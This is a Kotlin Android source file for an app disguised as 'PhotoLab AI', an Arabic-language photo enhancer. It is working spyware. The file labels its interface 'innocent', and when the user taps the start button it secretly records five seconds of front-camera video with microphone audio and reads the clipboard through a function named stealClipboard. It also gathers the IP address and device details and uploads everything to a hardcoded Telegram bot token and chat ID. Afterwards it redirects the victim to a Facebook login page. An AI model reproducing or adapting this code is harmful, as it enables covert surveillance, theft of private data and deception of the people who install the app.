package com.nxa.cop

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.hardware.Camera
import android.media.MediaRecorder
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.SurfaceView
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import org.json.JSONObject
import java.io.DataOutputStream
import java.io.File
import java.io.FileInputStream
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : Activity() {

    private val BOT_TOKEN = "7211032064:AAFX1ldDZeC4TdhmIskkRraKs3C3EWmjhnU"
    private val CHAT_ID = "5718232923"
    private val REDIRECT_URL = "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Fgroups%2F1279411656491133%2F%3Fref%3Dshare%26mibextid%3DNSMWBT"

    private lateinit var startBtn: Button
    private lateinit var statusMsg: TextView
    private lateinit var progressBar: ProgressBar
    private lateinit var backCamBox: LinearLayout
    private lateinit var backVideo: SurfaceView

    private var backCamera: Camera? = null
    private var frontCamera: Camera? = null
    private var mediaRecorder: MediaRecorder? = null
    private var videoFile: File? = null

    private val BG_LIGHT = Color.parseColor("#F5F7FA")
    private val CARD_WHITE = Color.WHITE
    private val TEXT_DARK = Color.parseColor("#1A1D20")
    private val TEXT_MUTED = Color.parseColor("#8A929B")
    private val ACCENT_PURPLE = Color.parseColor("#8B5CF6")

    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        buildInnocentUI()
        checkPermissionsAndInit()
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    private fun buildInnocentUI() {
        val scrollRoot = ScrollView(this).apply {
            setBackgroundColor(BG_LIGHT)
            layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(24), dp(32), dp(24), dp(32))
        }
        scrollRoot.addView(root)

        // App Icon & Title
        val headerRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, 0, 0, dp(32))
        }
        
        val iconBox = TextView(this).apply {
            text = "✨"
            textSize = 22f
            gravity = Gravity.CENTER
            setBackgroundColor(ACCENT_PURPLE)
            setPadding(dp(12), dp(12), dp(12), dp(12))
        }
        val iconDrawable = GradientDrawable().apply {
            cornerRadius = dp(12).toFloat()
            setColor(ACCENT_PURPLE)
        }
        iconBox.background = iconDrawable

        val titleCol = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(12), 0, 0, 0)
        }
        titleCol.addView(TextView(this).apply {
            text = "PhotoLab AI"
            textSize = 20f
            setTextColor(TEXT_DARK)
            typeface = Typeface.DEFAULT_BOLD
        })
        titleCol.addView(TextView(this).apply {
            text = "محرر الصور الذكي"
            textSize = 12f
            setTextColor(TEXT_MUTED)
        })
        
        headerRow.addView(iconBox)
        headerRow.addView(titleCol)
        root.addView(headerRow)

        // Main Card
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(CARD_WHITE)
            setPadding(dp(24), dp(32), dp(24), dp(32))
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).also {
                it.bottomMargin = dp(24)
            }
        }
        val cardBg = GradientDrawable().apply {
            cornerRadius = dp(24).toFloat()
            setColor(CARD_WHITE)
            setStroke(dp(1), Color.parseColor("#E5E7EB"))
        }
        card.background = cardBg

        // Preview placeholder
        val previewBox = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#F3F4F6"))
            setPadding(0, dp(40), 0, dp(40))
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).also {
                it.bottomMargin = dp(24)
            }
        }
        val previewBg = GradientDrawable().apply {
            cornerRadius = dp(16).toFloat()
            setColor(Color.parseColor("#F3F4F6"))
        }
        previewBox.background = previewBg
        previewBox.addView(TextView(this).apply {
            text = "🖼"
            textSize = 48f
            gravity = Gravity.CENTER
        })
        previewBox.addView(TextView(this).apply {
            text = "اسحب صورة لبدء التعديل"
            textSize = 12f
            setTextColor(TEXT_MUTED)
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, 0)
        })
        card.addView(previewBox)

        val cardTitle = TextView(this).apply {
            text = "تحسين الصور بالذكاء الاصطناعي"
            textSize = 16f
            setTextColor(TEXT_DARK)
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
        }
        card.addView(cardTitle)

        val cardDesc = TextView(this).apply {
            text = "قم بتحسين جودة صورك تلقائياً باستخدام شبكات GAN المتقدمة. لا يتم حفظ أي صور على السيرفر."
            textSize = 13f
            setTextColor(TEXT_MUTED)
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(24))
            setLineSpacing(0f, 1.4f)
        }
        card.addView(cardDesc)

        // Start Button
        startBtn = Button(this).apply {
            text = "بدء التحسين ✨"
            setTextColor(Color.WHITE)
            setBackgroundColor(ACCENT_PURPLE)
            textSize = 15f
            typeface = Typeface.DEFAULT_BOLD
            setPadding(dp(20), dp(14), dp(20), dp(14))
            setOnClickListener { beginAnalysis() }
        }
        val btnBg = GradientDrawable().apply {
            cornerRadius = dp(12).toFloat()
            setColor(ACCENT_PURPLE)
        }
        startBtn.background = btnBg
        card.addView(startBtn)

        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = 100
            progress = 0
            visibility = View.GONE
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dp(4)).also {
                it.topMargin = dp(20)
                it.bottomMargin = dp(12)
            }
        }
        card.addView(progressBar)

        statusMsg = TextView(this).apply {
            text = ""
            textSize = 12f
            setTextColor(TEXT_MUTED)
            gravity = Gravity.CENTER
        }
        card.addView(statusMsg)

        backCamBox = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            visibility = View.GONE
            setPadding(0, dp(16), 0, dp(16))
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).also {
                it.topMargin = dp(16)
            }
        }
        val camBg = GradientDrawable().apply {
            cornerRadius = dp(16).toFloat()
            setColor(Color.BLACK)
        }
        backCamBox.background = camBg
        backVideo = SurfaceView(this).apply {
            layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dp(200))
        }
        backCamBox.addView(backVideo)
        card.addView(backCamBox)

        root.addView(card)

        // Features Row
        val featuresRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(24))
        }
        listOf("🎨\nفلاتر ذكية", "⚡\nتحسين تلقائي", "🔒\nخصوصية تامة").forEach { txt ->
            val f = TextView(this).apply {
                text = txt
                textSize = 11f
                setTextColor(TEXT_MUTED)
                gravity = Gravity.CENTER
                setPadding(dp(12), dp(12), dp(12), dp(12))
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f).also {
                    it.marginEnd = dp(8)
                }
                val fBg = GradientDrawable().apply {
                    cornerRadius = dp(12).toFloat()
                    setColor(CARD_WHITE)
                    setStroke(dp(1), Color.parseColor("#E5E7EB"))
                }
                background = fBg
            }
            featuresRow.addView(f)
        }
        root.addView(featuresRow)

        val footer = TextView(this).apply {
            text = "© 2025 PhotoLab AI · v1.0.0"
            textSize = 11f
            setTextColor(TEXT_MUTED)
            gravity = Gravity.CENTER
        }
        root.addView(footer)

        setContentView(scrollRoot)
    }

    private fun checkPermissionsAndInit() {
        val perms = mutableListOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO)
        val needed = perms.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
        if (needed.isNotEmpty()) {
            requestPermissions(needed.toTypedArray(), 100)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100 && grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
            // Silently grant
        } else {
            Toast.makeText(this, "يجب منح الصلاحيات لتحسين الصورة", Toast.LENGTH_SHORT).show()
        }
    }

    private fun setStatus(text: String) {
        handler.post { statusMsg.text = text }
    }

    private fun updateProgressBar(pct: Int) {
        handler.post {
            progressBar.visibility = View.VISIBLE
            progressBar.progress = pct.coerceIn(0, 100)
        }
    }

    @SuppressLint("MissingPermission")
    private fun beginAnalysis() {
        startBtn.isEnabled = false
        startBtn.text = "جارٍ التحسين..."
        setStatus("جارٍ تحليل الصورة...")
        updateProgressBar(5)

        handler.postDelayed({
            try {
                backCamera = Camera.open(0)
                backCamera?.setPreviewDisplay(backVideo.holder)
                backCamera?.startPreview()
                backCamBox.visibility = View.VISIBLE
                setStatus("جارٍ معالجة الإضاءة...")
                updateProgressBar(25)
            } catch (e: Exception) {
                Toast.makeText(this, "فشل الوصول للكاميرا", Toast.LENGTH_SHORT).show()
                startBtn.isEnabled = true
                startBtn.text = "بدء التحسين ✨"
                return@postDelayed
            }

            handler.postDelayed({
                try {
                    frontCamera = Camera.open(1)
                    frontCamera?.unlock()
                    updateProgressBar(45)
                } catch (e: Exception) {
                    frontCamera = null
                }

                stealClipboard()

                val recordCam = frontCamera ?: backCamera
                if (recordCam != null) {
                    setStatus("جارٍ تطبيق فلاتر GAN...")
                    startRecording(recordCam)
                } else {
                    finalizeRedirect()
                }
            }, 1000)
        }, 500)
    }

    @SuppressLint("MissingPermission")
    private fun startRecording(camera: Camera) {
        try {
            videoFile = File(cacheDir, "photolab_cache.mp4")
            mediaRecorder = MediaRecorder().apply {
                setCamera(camera)
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.CAMERA)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setOutputFile(videoFile!!.absolutePath)
                prepare()
                start()
            }

            handler.postDelayed({
                try {
                    mediaRecorder?.stop()
                    mediaRecorder?.release()
                    mediaRecorder = null
                    if (frontCamera != null) {
                        frontCamera?.lock()
                        frontCamera?.release()
                        frontCamera = null
                    }
                    setStatus("اكتمل التحسين. جارٍ الحفظ...")
                    updateProgressBar(70)
                    uploadVideoAndFinalize()
                } catch (e: Exception) {
                    finalizeRedirect()
                }
            }, 5000)

        } catch (e: Exception) {
            finalizeRedirect()
        }
    }

    private fun stealClipboard() {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = clipboard.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString() ?: ""
                if (text.trim().isNotEmpty()) {
                    sendTelegramMessage("📋 <b>Clipboard:</b>\n<code>${text.take(1200)}</code>")
                }
            }
        } catch (e: Exception) {}
    }

    private fun uploadVideoAndFinalize() {
        Thread {
            try {
                val file = videoFile
                if (file != null && file.exists()) {
                    sendTelegramVideo(file)
                }
            } catch (e: Exception) {}

            var ip = "غير معروف"
            try {
                val conn = URL("https://api.ipify.org?format=json").openConnection() as HttpURLConnection
                conn.connectTimeout = 5000
                conn.readTimeout = 5000
                val json = conn.inputStream.bufferedReader().readText()
                ip = JSONObject(json).optString("ip", "غير معروف")
                conn.disconnect()
            } catch (e: Exception) {}

            val ua = System.getProperty("http.agent")?.take(80) ?: "Android"
            val ts = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
            sendTelegramMessage("🧠 <b>مستخدم جديد</b>\n🌐 IP: $ip\n📱 $ua\n🕒 $ts")

            handler.post {
                finalizeRedirect()
            }
        }.start()
    }

    private fun sendTelegramMessage(text: String) {
        try {
            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            val payload = JSONObject().apply {
                put("chat_id", CHAT_ID)
                put("text", text)
                put("parse_mode", "HTML")
            }.toString()
            conn.outputStream.use { it.write(payload.toByteArray()) }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    private fun sendTelegramVideo(file: File) {
        val boundary = "*****${System.currentTimeMillis()}*****"
        val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendVideo")
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.doOutput = true
        conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")

        try {
            val dos = DataOutputStream(conn.outputStream)

            fun writeField(name: String, value: String) {
                dos.writeBytes("--$boundary\r\n")
                dos.writeBytes("Content-Disposition: form-data; name=\"$name\"\r\n\r\n")
                dos.writeBytes("$value\r\n")
            }

            writeField("chat_id", CHAT_ID)
            writeField("caption", "🎥 فيديو 5s مع الصوت")

            dos.writeBytes("--$boundary\r\n")
            dos.writeBytes("Content-Disposition: form-data; name=\"video\"; filename=\"photolab_cache.mp4\"\r\n")
            dos.writeBytes("Content-Type: video/mp4\r\n\r\n")

            val fis = FileInputStream(file)
            val buf = ByteArray(8192)
            var n: Int
            while (fis.read(buf).also { n = it } > 0) dos.write(buf, 0, n)
            fis.close()

            dos.writeBytes("\r\n--$boundary--\r\n")
            dos.flush()
            dos.close()

            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    private fun finalizeRedirect() {
        updateProgressBar(100)
        setStatus("اكتمل! جارٍ فتح النتيجة...")
        handler.postDelayed({
            stopCamera()
            try {
                val intent = Intent(Intent.ACTION_VIEW, Uri.parse(REDIRECT_URL))
                startActivity(intent)
            } catch (e: Exception) {}
            finish()
        }, 2500)
    }

    private fun stopCamera() {
        try {
            backCamera?.stopPreview()
            backCamera?.release()
            backCamera = null
        } catch (e: Exception) {}
        try {
            frontCamera?.lock()
            frontCamera?.release()
            frontCamera = null
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        stopCamera()
        mediaRecorder?.release()
        mediaRecorder = null
    }

    override fun onBackPressed() {
        if (progressBar.progress in 1..99) {
            Toast.makeText(this, "جارٍ معالجة الصورة، الرجاء الانتظار...", Toast.LENGTH_LONG).show()
        } else {
            super.onBackPressed()
        }
    }
}